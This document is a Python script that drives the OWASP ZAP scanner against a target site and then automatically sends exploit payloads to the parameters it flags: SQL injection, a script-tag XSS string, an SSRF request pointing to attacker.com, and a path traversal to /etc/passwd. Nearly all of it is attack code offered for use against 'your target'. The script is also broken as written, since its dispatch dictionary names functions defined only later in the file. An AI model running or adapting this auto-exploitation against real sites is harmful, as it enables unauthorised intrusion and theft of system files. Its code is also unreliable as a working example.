from zapv2 import ZAPv2
import requests
import urllib.parse

# Define the target URL
target_url = "http://example.com"  # Replace with your target URL

# Initialize the ZAP API client
zap = ZAPv2(apikey="your_api_key", proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})

# Access the ZAP spiders and active scan
zap.spider.scan(target_url)
zap.spider.wait_for_complete()
zap.active_scan.scan(target_url)
zap.active_scan.wait_for_complete()

# Get a list of alerts (vulnerabilities)
alerts = zap.core.alerts()

# Define a dictionary to map alert names to exploit functions
exploit_functions = {
    "SQL Injection": exploit_sql_injection,
    "Cross-Site Scripting (XSS)": exploit_xss,
    "Server-Side Request Forgery (SSRF)": exploit_ssrf,
    "Path Traversal": exploit_path_traversal,  # Add path traversal function
    # Add more vulnerability types and corresponding exploit functions as needed
}

# Iterate through alerts and exploit vulnerabilities if functions are defined
for alert in alerts:
    alert_name = alert['alert']
    if alert_name in exploit_functions:
        print(f"Exploiting {alert_name} at URL: {alert['url']}")
        exploit_functions[alert_name](alert['url'], alert['param'])

# Shutdown ZAP
zap.core.shutdown()

# Define functions to exploit specific vulnerabilities
def exploit_sql_injection(url, param):
    # Generate a simple SQL Injection payload
    sql_payload = "' OR '1'='1"  # This is a basic example
    
    # Craft the malicious URL
    malicious_url = f"{url}?{param}={urllib.parse.quote(sql_payload)}"
    
    # Send a GET request to the malicious URL
    response = requests.get(malicious_url)
    
    # Print or handle the response as needed
    print("SQL Injection Exploited:", response.status_code, response.text)

def exploit_xss(url, param):
    # Generate a simple XSS payload
    xss_payload = "<script>alert('XSS')</script>"  # This is a basic example
    
    # Craft the malicious URL
    malicious_url = f"{url}?{param}={urllib.parse.quote(xss_payload)}"
    
    # Send a GET request to the malicious URL
    response = requests.get(malicious_url)
    
    # Print or handle the response as needed
    print("XSS Exploited:", response.status_code, response.text)

def exploit_ssrf(url, param):
    # Generate an SSRF payload
    ssrf_payload = "http://attacker.com/malicious-resource"  # Replace with your malicious resource URL
    
    # Craft the malicious URL
    malicious_url = f"{url}?{param}={urllib.parse.quote(ssrf_payload)}"
    
    # Send a GET request to the malicious URL
    response = requests.get(malicious_url)
    
    # Print or handle the response as needed
    print("SSRF Exploited:", response.status_code, response.text)

def exploit_path_traversal(url, param):
    # Generate a path traversal payload
    path_payload = "../../../../etc/passwd"  # Modify this as needed
    
    # Craft the malicious URL
    malicious_url = f"{url}?{param}={urllib.parse.quote(path_payload)}"
    
    # Send a GET request to the malicious URL
    response = requests.get(malicious_url)
    
    # Print or handle the response as needed
    print("Path Traversal Exploited:", response.status_code, response.text)

# Add more exploit functions for other vulnerability types as needed
